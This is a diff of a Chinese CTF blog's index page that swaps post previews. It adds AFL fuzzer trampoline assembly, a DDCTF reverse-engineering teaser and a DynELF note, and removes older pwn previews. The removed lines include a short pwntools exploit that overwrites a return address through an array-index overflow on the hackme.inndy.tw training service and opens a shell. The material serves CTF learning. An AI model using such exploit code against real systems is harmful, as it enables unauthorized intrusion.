+<h2 id="trampoline-fmt-64"><a href="#trampoline-fmt-64" class="headerlink" title="trampoline_fmt_64"></a>trampoline_fmt_64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"/* --- AFL TRAMPOLINE (64-BIT) --- */\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">".align 4\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"leaq -(128+24)(%%rsp), %%rsp\n"</span></span><br><span class="line">  <span class="string">"movq %%rdx,  0(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq %%rcx,  8(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq %%rax, 16(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq $0x%08x, %%rcx\n"</span></span><br><span class="line">  <span class="string">"call __afl_maybe_log\n"</span></span><br><span class="line">  <span class="string">"movq 16(%%rsp), %%rax\n"</span></span><br><span class="line">  <span class="string">"movq  8(%%rsp), %%rcx\n"</span></span><br><span class="line">  <span class="string">"movq  0(%%rsp), %%rdx\n"</span></span><br><span class="line">  <span class="string">"leaq (128+24)(%%rsp), %%rsp\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"/* --- END --- */\n"</span></span><br><span class="line">  <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/02/14/AFL源码分析计划3/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/DDCTF之re/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/02/14/DDCTF之re/" itemprop="url">DDCTF的两道简单逆向</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -1423,11 +1416,14 @@
 
       
         
-          <h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p>ARM pwn，虽然本地运行不起来，但是也不需要，直接挂远程就行了，</p>
-<p>先是200次循环计算出结果后，输入一串字符处有溢出，将变量覆盖为0x12235612调用后门</p>
+          <h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>32位PE文件，加了upx壳，先脱壳，随便一个工具就可以</p>
+<p>脱完壳扔IDA，</p>
+<p><img src="\images\DDCTF\1.jpg" alt></p>
+<p>逻辑其实很简单就是输入一串字符串，经过<code>sub_401000</code>这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较</p>
+<p>那么主要就是分析这个函数了，</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/hfctf/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/DDCTF之re/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1478,7 +1474,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/hackme.inndy之pwn/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/DynELF实现无libc泄露函数地址/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1497,7 +1493,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/hackme.inndy之pwn/" itemprop="url">hackme.inndy之pwn</a></h1>
+                <a class="post-title-link" href="/2022/02/14/DynELF实现无libc泄露函数地址/" itemprop="url">DynELF实现无libc.so泄露函数地址</a></h1>
         
 
         <div class="post-meta">
@@ -1509,8 +1505,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -1570,15 +1566,10 @@
 
       
         
-          <h2 id="catflag"><a href="#catflag" class="headerlink" title="catflag"></a>catflag</h2><p>nc 连接直接get shell </p>
-<h2 id="homeosrk"><a href="#homeosrk" class="headerlink" title="homeosrk"></a>homeosrk</h2><p>数组下标溢出，绕过canary保护直接修改ret地址为后门函数<code>call_me_mabe</code></p>
-<p><img src="\images\piture\1.png" alt></p>
-<p>这里可以算出arr[14]为ret位置</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process('./homework')</span></span><br><span class="line">p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7701</span>)</span><br><span class="line">call_me = <span class="number">0x80485FB</span></span><br><span class="line"><span class="keyword">print</span> str(call_me)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name? '</span>)</span><br><span class="line">p.sendline(<span class="string">'n0va'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'4 &gt; dump all numbers\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">' &gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index to edit: '</span>)</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'How many? '</span>)</span><br><span class="line">p.sendline(str(call_me))</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          <h2 id="DynELF简介"><a href="#DynELF简介" class="headerlink" title="DynELF简介"></a>DynELF简介</h2><p>在做漏洞利用的时候，由于ASLR的影响，我们在获取某些函数地址的时候，需要一些特殊操作；一种方法是先泄露出libc.so中的某个函数，然后根据函数之间的偏移，计算我们需要的函数地址，但是这种方法局限于我们需要找到和目标服务器上一样的libc.so，而有些特殊情况下往往找不到对应的libc.so文件；另一种方法就是利用如pwntools的DynELF模块，对内存进行搜索，直到得到我们需要的函数。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/hackme.inndy之pwn/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/DynELF实现无libc泄露函数地址/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1629,7 +1620,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/Fuzz初探/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/Fuzz初探/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1648,7 +1639,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/Fuzz初探/" itemprop="url">Afl-Fuzz 初探</a></h1>
+                <a class="post-title-link" href="/2022/02/14/Fuzz初探/" itemprop="url">Afl-Fuzz 初探</a></h1>
         
 
         <div class="post-meta">
@@ -1660,8 +1651,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -1724,7 +1715,7 @@
           <h2 id="Afl-Fuzz"><a href="#Afl-Fuzz" class="headerlink" title="Afl-Fuzz"></a>Afl-Fuzz</h2><p>AFL(American fuzzy lop)号称是当前最高级的Fuzzing测试工具之一，由谷歌Michal Zalewski所开发。通过对源码编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径；与其它基于插桩技术的fuzz相比，afl-fuzz具有较低的性能消耗，有各种高效的fuzzing策略和tricks最小化技巧，不需要先进行复杂的配置。当然AFL也支持对没有源码的二进制程序进行学习方式，但是需要QEMU的支持。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/Fuzz初探/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/Fuzz初探/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1814,7 +1805,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">65</span>
+                  <span class="site-state-item-count">67</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1918,7 +1909,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
